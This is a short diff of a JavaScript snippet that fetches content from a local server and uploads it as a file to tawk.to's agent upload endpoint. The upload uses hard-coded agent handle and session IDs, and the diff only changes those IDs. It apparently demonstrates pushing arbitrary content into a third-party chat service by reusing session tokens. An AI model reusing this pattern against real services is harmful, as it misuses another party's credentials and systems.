@@ -9,7 +9,7 @@ s0.parentNode.insertBefore(s1,s0);
 
 })();
 
-fetch("http://127.0.0.1:9000/view/f1135719-d3a5-4534-9bc1-f7ddcf4c8cb3").then((res) => {
+fetch("http://127.0.0.1:9000/view/46b5d1b0-8a08-4e75-818a-4003a7d61a5c").then((res) => {
     return res.text();
   }).then(data => {
 			var formData = new FormData();
@@ -19,7 +19,7 @@ fetch("http://127.0.0.1:9000/view/f1135719-d3a5-4534-9bc1-f7ddcf4c8cb3").then((r
 
     formData.append("upload", file);
 
-    fetch("https://upload.tawk.to/upload/page/agent?handle=8194642e04cf8530ca49d5432a72ffc1d06c3569&pageId=61830caa6bb0760a494106d7&agentSessionId=61855f3369d9e20b02eb53da",{
+    fetch("https://upload.tawk.to/upload/page/agent?handle=a675aee4143d8173624ca403828cbb9793891f10&pageId=61830caa6bb0760a494106d7&agentSessionId=6185ddfe69d9e20b02ec5920",{
         method: 'POST',
         body: formData
     });
